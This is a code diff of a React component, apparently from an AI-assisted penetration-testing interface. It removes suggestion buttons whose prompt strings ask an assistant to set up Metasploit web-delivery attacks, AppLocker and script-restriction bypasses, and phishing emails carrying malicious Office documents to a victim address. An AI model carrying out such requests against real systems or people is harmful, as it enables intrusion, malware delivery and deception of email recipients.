-                    <button className={styles.suggestion} onClick={() => setInputValue('Set up a PHP web delivery attack (exploit/multi/script/web_delivery TARGET 1) and generate a one-liner for a victim web server running PHP')} disabled={!isConnected}>
-                      PHP web delivery (web servers)
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Set up a pubprn web delivery attack (exploit/multi/script/web_delivery TARGET 4) and generate a one-liner for the victim to bypass script restrictions')} disabled={!isConnected}>
-                      pubprn script bypass (web delivery)
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Set up a SyncAppvPublishingServer web delivery attack (exploit/multi/script/web_delivery TARGET 5) for the victim to bypass Windows restrictions')} disabled={!isConnected}>
-                      SyncAppvPublishing bypass (web delivery)
-                    </button>
-
-                    {/* ── Web Delivery (per OS) ── */}
-                    <span className={styles.templateOsLabel}>Web Delivery</span>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Set up a Python web delivery attack (exploit/multi/script/web_delivery TARGET 0) for a Linux victim with Python installed and generate the one-liner')} disabled={!isConnected}>
-                      Linux — Python web delivery
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Set up a Python web delivery attack (exploit/multi/script/web_delivery TARGET 0) for a macOS victim and generate the one-liner command')} disabled={!isConnected}>
-                      macOS — Python web delivery
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Set up a PowerShell web delivery attack (exploit/multi/script/web_delivery TARGET 2) for a Windows victim and generate the one-liner command')} disabled={!isConnected}>
-                      Windows — PowerShell web delivery
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Set up a Regsvr32 web delivery attack (exploit/multi/script/web_delivery TARGET 3) for a Windows victim to bypass AppLocker restrictions')} disabled={!isConnected}>
-                      Windows — Regsvr32 AppLocker bypass
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Set up a PHP web delivery attack (exploit/multi/script/web_delivery TARGET 1) for a victim web server running PHP and generate the one-liner')} disabled={!isConnected}>
-                      PHP server — PHP web delivery
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Set up a Python web delivery attack (exploit/multi/script/web_delivery TARGET 0) for any OS with Python installed — works on Linux, macOS, and Windows')} disabled={!isConnected}>
-                      Cross-platform — Python web delivery
-                    </button>
-
-                    {/* ── Email Delivery ── */}
-                    <span className={styles.templateOsLabel}>Email Delivery</span>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Generate a phishing payload and send it via email to the victim at target@example.com with a convincing IT support pretext')} disabled={!isConnected}>
-                      Send payload via phishing email
-                    </button>
-                    <button className={styles.suggestion} onClick={() => setInputValue('Generate a malicious Office document and send it via email to the victim at target@example.com disguised as an invoice attachment')} disabled={!isConnected}>
-                      Send malicious document via email
-                    </button>
+                    {SOCIAL_ENGINEERING_GROUPS.map(group => (
+                      <React.Fragment key={group.id}>
+                        <button
+                          className={`${styles.templateSubGroupHeader} ${openSocialSubGroup === group.id ? styles.templateSubGroupHeaderOpen : ''}`}
+                          onClick={() => setOpenSocialSubGroup(prev => prev === group.id ? null : group.id)}
+                        >
+                          <span>{group.title}</span>
+                          <ChevronDown size={12} className={styles.templateSubGroupChevron} />
+                        </button>
+                        {openSocialSubGroup === group.id && (
+                          <div className={styles.templateSubGroupItems}>
+                            {group.items.map((section, i) => (
+                              <React.Fragment key={i}>
+                                {section.osLabel && <span className={styles.templateOsLabel}>{section.osLabel}</span>}
+                                {section.suggestions.map((s, j) => (
+                                  <button key={j} className={styles.suggestion} onClick={() => setInputValue(s.prompt)} disabled={!isConnected}>
+                                    {s.label}
+                                  </button>
+                                ))}
+                              </React.Fragment>
+                            ))}
+                          </div>
+                        )}
+                      </React.Fragment>
+                    ))}
                   </div>
                 )}
               </div>
